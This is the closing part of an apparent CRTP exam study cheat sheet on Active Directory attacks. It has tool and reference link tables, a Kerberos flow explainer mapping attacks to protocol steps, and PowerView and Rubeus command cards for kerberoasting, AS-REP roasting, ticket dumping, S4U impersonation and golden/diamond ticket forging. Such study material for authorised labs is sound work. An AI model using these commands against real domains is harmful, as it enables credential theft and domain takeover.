| Powermad | Create machine accounts | https://github.com/Kevin-Robertson/Powermad |
| PowerUp | Local privesc | https://github.com/PowerShellMafia/PowerSploit |
| Invisi-Shell | Bypass PS logging | https://github.com/OmerYa/Invisi-Shell |
| Sliver C2 | Command & Control | https://github.com/BishopFox/sliver |
| MS-RPRN | PrintSpooler abuse | https://github.com/leechristensen/SpoolSample |

### Reference & Cheat Sheets

| Resource | URL |
|----------|-----|
| GTFOBins | https://gtfobins.github.io/ |
| HackTricks AD | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology |
| The Hacker Recipes | https://www.thehacker.recipes/ |
| adsecurity.org | https://adsecurity.org/ |
| harmj0y Blog (AD attacks) | https://blog.harmj0y.net/ |
| dirkjanm.io (delegation) | https://dirkjanm.io/ |
| CRTP GitHub Notes | https://github.com/0xJs/CRTP-cheatsheet |

### Understanding Kerberos (Deep Dive)

| Resource | URL |
|----------|-----|
| Kerberos Explained | https://adsecurity.org/?p=1389 |
| Kerberoasting Paper | https://www.blackhat.com/docs/us-14/materials/us-14-Ramiras-Kerberoasting.pdf |
| Golden Ticket Article | https://adsecurity.org/?p=1640 |
| AS-REP Roasting | https://blog.harmj0y.net/activedirectory/roasting-as-reps/ |
| Unconstrained Delegation | https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ |
| Constrained Delegation | https://posts.specterops.io/s4u2pwnage-132b798c7140 |
| RBCD | https://eladshamir.com/2019/01/28/Wagging-the-Dog.html |

### Lab Practice (CRTP-level boxes)

| Platform | Box/Path | URL |
|----------|----------|-----|
| Hack The Box | Forest, Monteverde, Cascade, Active | https://app.hackthebox.com |
| HTB Pro Labs | Offshore, RastaLabs | https://app.hackthebox.com/prolabs |
| TryHackMe | AD paths | https://tryhackme.com |
| OffSec PG | AD-focused boxes | https://www.offsec.com/labs/ |
| VulnHub | Throwback, Xtreme | https://vulnhub.com |

---

## Appendix A — Kerberos Deep Dive

### How Kerberos Authentication Works

```
╔═══════════════════════════════════════════════════════════════╗
║  KDC = Key Distribution Center (runs on DC)                  ║
║  Components: AS (Auth Service) + TGS (Ticket Granting Svc)  ╠══╗
║                                                               ║  ║
║  Step 1: AS-REQ                                              ║  ║
║    Client → KDC: "I want to authenticate, here's my hash"   ║  ║
║                                                               ║  ║
║  Step 2: AS-REP                                              ║  ║
║    KDC → Client: TGT (encrypted with krbtgt hash)           ║  ║
║                  + Session Key (encrypted with client hash)  ║  ║
║                                                               ║  ║
║  Step 3: TGS-REQ                                             ║  ║
║    Client → KDC: "I want access to SPN X, here's my TGT"   ║  ║
║                                                               ║  ║
║  Step 4: TGS-REP                                             ║  ║
║    KDC → Client: TGS (encrypted with SPN account's hash)    ║  ║
║                                                               ║  ║
║  Step 5: AP-REQ                                              ║  ║
║    Client → Service: "Here's my TGS"                        ║  ║
║                                                               ║  ║
║  Step 6: AP-REP                                              ║  ║
║    Service → Client: "Authenticated! Here's your session"   ╠══╝
╚═══════════════════════════════════════════════════════════════╝
```

### Attack Mapping to Kerberos Steps

```
Attack                   Step Abused
─────────────────────────────────────────────────
AS-REP Roasting      →  Step 2 (request AS-REP without pre-auth)
Kerberoasting        →  Step 4 (TGS encrypted with svc hash)
Pass-the-Ticket      →  Steps 3/5 (replay stolen TGT/TGS)
Golden Ticket        →  Step 2 (forge TGT with krbtgt hash)
Silver Ticket        →  Step 5 (forge TGS with svc hash)
Overpass-the-Hash    →  Step 1 (use NTLM hash to get TGT)
Unconstrained Deleg  →  Step 3 (cache user's TGT on server)
Constrained Deleg    →  Step 4 (S4U: impersonate user for TGS)
```

---

## Appendix B — PowerView Quick Reference Card

```powershell
# ═══ DOMAIN ═══════════════════════════════════════════════════
Get-Domain                      Get-DomainController
Get-DomainPolicy                Get-DomainSID

# ═══ USERS ════════════════════════════════════════════════════
Get-DomainUser                  Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired               
Find-DomainUserLocation

# ═══ GROUPS ═══════════════════════════════════════════════════
Get-DomainGroup                 Get-DomainGroupMember -Identity "DA"
Get-DomainGroup -UserName <u>   Find-LocalAdminAccess

# ═══ COMPUTERS ════════════════════════════════════════════════
Get-DomainComputer              Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# ═══ SHARES ═══════════════════════════════════════════════════
Find-DomainShare                Find-InterestingDomainShareFile

# ═══ ACLs ═════════════════════════════════════════════════════
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Add-DomainObjectAcl             Set-DomainObjectOwner

# ═══ GPO ══════════════════════════════════════════════════════
Get-DomainGPO                   Get-DomainGPOLocalGroup
Get-DomainGPOUserLocalGroupMapping

# ═══ TRUSTS ═══════════════════════════════════════════════════
Get-DomainTrust                 Get-ForestTrust
Get-ForestDomain                Get-DomainForeignGroupMember

# ═══ MODIFY ═══════════════════════════════════════════════════
Set-DomainObject                Set-DomainUserPassword
Add-DomainGroupMember           Set-DomainObjectOwner
```

---

## Appendix C — Rubeus Quick Reference Card

```powershell
# ═══ KERBEROAST ════════════════════════════════════════════
.\Rubeus.exe kerberoast /outfile:k.hash
.\Rubeus.exe kerberoast /user:<user> /format:hashcat

# ═══ AS-REP ROAST ══════════════════════════════════════════
.\Rubeus.exe asreproast /format:hashcat /outfile:a.hash

# ═══ GET TGT ═══════════════════════════════════════════════
.\Rubeus.exe asktgt /user:<u> /aes256:<h> /ptt
.\Rubeus.exe asktgt /user:<u> /rc4:<h> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# ═══ S4U (CONSTRAINED DELEGATION) ═════════════════════════
.\Rubeus.exe s4u /user:<u> /aes256:<h> /impersonateuser:Administrator /msdsspn:cifs/<host> /ptt

# ═══ TICKETS ═══════════════════════════════════════════════
.\Rubeus.exe ptt /ticket:<base64_or_file>
.\Rubeus.exe dump /luid:<luid> /nowrap
.\Rubeus.exe monitor /interval:5 /nowrap

# ═══ GOLDEN/SILVER ═════════════════════════════════════════
.\Rubeus.exe golden /aes256:<krbtgt_h> /user:Admin /id:500 /domain:x /sid:S-1-5-.. /ptt
.\Rubeus.exe diamond /krbkey:<h> /user:<u> /password:<p> /domain:x /dc:<dc> /ptt

# ═══ HASH ══════════════════════════════════════════════════
.\Rubeus.exe hash /password:<p> /user:<u> /domain:<d>
```

*CRTP | Altered Security | “The goal is not to get Domain Admin. The goal is to understand WHY you got Domain Admin.”*

By DarcHacker.

LinkedIn:www.linkedin.com/in/mostafa-ibrahim-60b543341
